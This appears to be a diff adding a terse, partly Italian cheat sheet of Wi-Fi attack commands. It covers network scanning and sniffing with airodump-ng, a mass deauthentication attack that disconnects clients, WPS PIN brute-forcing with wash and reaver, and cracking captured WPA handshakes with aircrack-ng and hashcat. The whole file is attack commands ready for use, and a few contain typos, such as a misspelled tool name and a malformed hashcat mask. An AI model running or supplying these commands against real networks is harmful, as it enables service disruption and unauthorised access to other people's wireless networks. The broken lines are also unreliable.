@@ -1,0 +1,31 @@
+airodump-ng wlan0
+
+--------both bands:--------------------------
+airodump-ng --band abg wlan0
+
+--------5GHz:--------------------------
+airodump-ng --band a wlan0
+
+--------sniff:--------------------------
+airodump-ng --bssid value --channel value wlan0
+
+--------deauth attack:--------------------------
+aireplay-ng --deauth 10000000 -a bssid_rete -c client_to_disconnect [-D if 5GHz] wlan0
+
+--------WPS enablwe:--------------------------
+wash --interface wlan0
+WPS1.0 vulnerabile 
+airepla-ng --fakeauth 30 -a target_BSSID -h indirizzo_wlan0_da_ifconfig wlan0
+
+another tab: reaver cerca pin WPS
+reaver --bssid target_BSSID --channel value --interface wlan0 --no-associate
+
+--------x Cracking hashcat--------------------------
+aircrack-ng -b bssid -w wordlist file.cap
+hashcat -m 22000 filepath.h22000 -a 3 d?d?d?d?d?d?d?d?d?d? -d 1,2,3 
+-d devices che voglio usare, per vedere i disponibili 
+hashcat -I
+
+Per andare da .cap a .h22000 due operazioni
+editcap -F pcap file.cap file.pcap
+hcxpcapngtool -o file.h22000 file.pcap
